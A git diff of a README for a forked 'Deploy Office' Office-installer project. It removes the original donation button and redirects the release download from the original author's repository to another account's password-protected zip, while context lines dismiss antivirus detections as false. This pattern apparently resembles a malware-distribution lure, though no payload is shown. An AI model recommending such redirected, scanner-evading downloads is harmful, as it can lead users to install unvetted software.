@@ -1,5 +1,5 @@
-﻿[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/W7W64WAXN)
-
+IMPORTED THIS PROJECT FROM THIS [REPO](https://github.com/asheroto/Deploy-Office)
+I imported it for my personal use  
 # Deploy Office
 
 ![Screenshot](https://github.com/asheroto/Deploy-Office/blob/master/screenshot.webp?raw=true)
@@ -56,7 +56,7 @@ Desktop shortcuts will be created for the installed Office application(s).
 - The false detection doesn't occur on all computers.
 - Feel free to compile yourself from the source code if you'd rather do that. 😊
 
-Download the [latest version](https://github.com/asheroto/Deploy-Office/releases/latest/download/Deploy-Office.zip) in the releases section. Password for the zip file is `password`.
+Download the [latest version](https://github.com/darsaliq00/OFFICE/releases/latest/download/Deploy-Office.zip) in the releases section. Password for the zip file is `password`.
 
 ## Licensing Note
 
